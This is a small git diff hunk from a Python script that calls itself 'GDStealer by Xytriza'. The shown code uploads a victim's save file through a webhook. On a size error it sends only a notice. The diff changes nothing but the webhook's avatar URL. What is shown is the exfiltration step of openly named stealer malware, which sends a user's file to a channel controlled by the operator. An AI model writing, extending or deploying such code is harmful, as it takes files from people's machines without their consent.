@@ -64,10 +64,10 @@ def main():
     file = File(savefile_path)
 
     try:
-        webhook.send(embed=embed, file=file, username="GDStealer by Xytriza", avatar_url="https://media.xytriza.com/icon.png")
+        webhook.send(embed=embed, file=file, username="GDStealer by Xytriza", avatar_url="https://xytriza.com/assets/icon.png")
     except errors.HTTPException:
         embed.set_author(name="Error: Savefile too big")
-        webhook.send(embed=embed, username="GDStealer by Xytriza", avatar_url="https://media.xytriza.com/icon.png")
+        webhook.send(embed=embed, username="GDStealer by Xytriza", avatar_url="https://xytriza.com/assets/icon.png")
 
 if __name__ == "__main__":
     try:
